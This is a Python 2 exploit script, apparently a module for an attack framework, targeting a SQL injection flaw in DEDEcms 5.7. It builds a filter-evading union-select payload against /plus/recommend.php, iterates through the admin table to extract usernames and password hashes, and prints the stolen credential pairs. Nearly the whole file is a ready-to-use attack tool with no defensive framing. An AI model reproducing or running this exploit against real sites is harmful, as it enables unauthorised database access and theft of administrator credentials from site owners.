import requests
import re

def info():
    info = {
        'name': 'dedecms_57_sqli',
        'description': 'DEDEcms 5.7 SQL injection',
        'date': '2019-01-01',
        'parameters': {
            'url': 'Target addr',
            'protocol': 'Protocol, Default: http',
            'timeout': 'Request timeout, Default: 3'
        },
        'referer': 'https://cloud.tencent.com/developer/article/1035082'
    }


class exploit():
    def __init__(self):
        self.param = {'url': None, 'protocol': 'http', 'timeout': 3}


    def exploit(self):
        id = 0
        url = ''
        url += '%s://' %(self.param['protocol'])
        url += self.param['url']
        userlist = []
        try:
            while True:
                try:
                    id += 1
                    payload = url
                    payload += "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\'or mid=@`\\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` limit+"
                    payload += str(id)
                    payload += ",1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type] [type]=application/octet-stream&_FILES[type][size]=111"
                    resp = requests.get(payload, timeout=int(self.param['timeout'])).text.decode("utf8")
                    userpass = re.findall('<h2>\xe6\x8e\xa8\xe8\x8d\x90\xef\xbc\x9a|(.*)</h2>', resp)[0].split('|')
                    username = userpass[1]
                    password = userpass[2]
                    print '[*] Fetched username: %s, password %s' %(username, password)
                    if not username:
                        break
                    userlist.append({'username': username, 'password': password})
                except Exception, e:
                    print '[!] Error fetching user: %s' %(str(e))
                    pass
            if not userlist:
                print '[*] No user found.'
                return
            print '[+] Fetch completed, fetched total %s username-password pair.' %(str(len(userlist)))
            print '[+] Incoming username-password list:'
            print ' |   USERNAME            PASSWORD'
            for i in userlist:
                print ' |   %s%s' %(str(i['username']).ljust(20), str(i['password']))
            print '[+] Exploit complete.'
        except Exception, e:
            print '[!] Exploit failed: %s' %(str(e))
        return

    def info(self):
        ExpInf = info()
        print '[*] Incoming exploit information.'
        print ' |   NAME: %s' %(ExpInf['name'])
        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
        print ' |   DATE: %s' %(ExpInf['date'])
        print ' |   PARAMETERS:'
        parameters = ExpInf['parameters']
        for item in ExpInf['parameters'].keys():
            print ' |   |  %s: %s' %(item, parameters[item])
        print ' |   REFERER: %s' %(ExpInf['referer'])
        return

